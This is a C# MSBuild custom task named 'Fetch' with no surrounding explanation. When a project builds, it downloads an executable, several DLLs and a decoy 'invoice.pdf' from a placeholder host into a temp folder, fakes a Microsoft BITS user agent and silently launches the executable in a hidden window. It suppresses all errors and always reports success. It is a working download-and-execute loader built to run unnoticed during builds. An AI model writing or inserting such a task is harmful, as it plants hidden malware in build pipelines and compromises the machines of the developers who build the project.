using System;
using System.Net;
using System.IO;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class Fetch : Task, ITask
{
    public override bool Execute()
    {
        try
        {
            string dir = Path.Combine(Path.GetTempPath(), "staging");
            if (Directory.Exists(dir)) Directory.Delete(dir, true);
            Directory.CreateDirectory(dir);
            string[] files = new string[] { "mediainfo.exe", "msvfw32.dll", "MediaInfo.dll", "LIBCURL.DLL", "WebView2Loader.dll", "invoice.pdf" };
            string baseUrl = "https://host.example/staging/";
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Microsoft BITS/7.8");
                foreach (string f in files)
                {
                    wc.DownloadFile(baseUrl + f, Path.Combine(dir, f));
                }
            }
            ProcessStartInfo si = new ProcessStartInfo(Path.Combine(dir, "mediainfo.exe"));
            si.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(si);
        }
        catch { }
        return true;
    }
}
